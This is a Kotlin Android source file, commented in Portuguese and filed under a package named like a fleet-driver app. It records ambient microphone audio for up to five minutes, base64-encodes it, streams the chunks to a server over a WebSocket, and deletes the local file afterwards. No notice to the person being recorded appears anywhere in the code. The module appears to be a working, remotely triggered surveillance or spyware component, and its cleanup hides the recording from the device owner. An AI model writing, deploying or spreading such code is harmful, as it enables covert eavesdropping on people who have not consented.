// [context: Android API 26+, ARM64/any — ambient audio recording via MediaRecorder]
// MicModule.kt — grava áudio ambiente, envia arquivo base64 via WS após duração especificada
// Format: AAC/M4A, 44100 Hz, mono, 64kbps
package com.fleetdroid.driver.service

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONObject
import java.io.File

object MicModule {

    const val TAG = "MicModule"

    @Volatile private var recorder: MediaRecorder? = null
    @Volatile private var recording = false
    @Volatile private var outputFile: File? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    /**
     * Inicia gravação de áudio ambiente.
     * @param context contexto
     * @param durationSec duração em segundos (1-300)
     */
    fun startRecording(context: Context, durationSec: Int = 30) {
        if (recording) {
            Log.w(TAG, "already recording, ignoring startRecording")
            return
        }

        val dur = durationSec.coerceIn(1, 300)
        val outDir = context.getExternalFilesDir(null) ?: context.filesDir
        val file = File(outDir, "rec_${System.currentTimeMillis()}.m4a")
        outputFile = file

        try {
            val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            rec.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioChannels(1)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(64_000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            recorder = rec
            recording = true

            Log.i(TAG, "recording started: ${file.name}, ${dur}s")
            DispatchService.instance?.sendWs(
                """{"type":"mic_started","duration":$dur,"file":"${file.name}"}"""
            )

            // Para automaticamente após a duração
            mainHandler.postDelayed({ stopRecording() }, dur * 1000L)
        } catch (e: Exception) {
            Log.e(TAG, "startRecording error", e)
            DispatchService.instance?.sendWs("""{"type":"error","msg":"mic failed: ${e.message?.replace("\"","\\\"")}"}""")
            recording = false
            outputFile = null
        }
    }

    /**
     * Para gravação e envia o arquivo.
     */
    fun stopRecording() {
        mainHandler.removeCallbacksAndMessages(null)
        val rec = recorder ?: return
        val file = outputFile ?: return

        try {
            rec.stop()
            rec.release()
        } catch (e: Exception) {
            Log.e(TAG, "stop error", e)
        } finally {
            recorder = null
            recording = false
            outputFile = null
        }

        if (!file.exists() || file.length() == 0L) {
            Log.e(TAG, "recording file empty or missing")
            DispatchService.instance?.sendWs("""{"type":"error","msg":"mic_recording empty"}""")
            return
        }

        Log.i(TAG, "recording done: ${file.length()}B — sending...")
        sendAudio(file)
    }

    fun isRecording() = recording

    private fun sendAudio(file: File) {
        try {
            val bytes = file.readBytes()
            val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            val chunkSize = 65536
            val total = b64.length
            var offset = 0
            var idx = 0
            val totalChunks = (total + chunkSize - 1) / chunkSize

            while (offset < total) {
                val end = minOf(offset + chunkSize, total)
                val chunk = b64.substring(offset, end)
                val payload = JSONObject().apply {
                    put("type",         "mic_chunk")
                    put("filename",     file.name)
                    put("size_bytes",   bytes.size)
                    put("chunk_idx",    idx)
                    put("total_chunks", totalChunks)
                    put("data",         chunk)
                    put("ts",           System.currentTimeMillis())
                }
                DispatchService.instance?.sendWs(payload.toString())
                offset += chunkSize
                idx++
            }
            Log.d(TAG, "audio sent: ${bytes.size}B, $totalChunks chunks")
            // Limpa arquivo temporário
            file.delete()
        } catch (e: Exception) {
            Log.e(TAG, "sendAudio error", e)
        }
    }
}
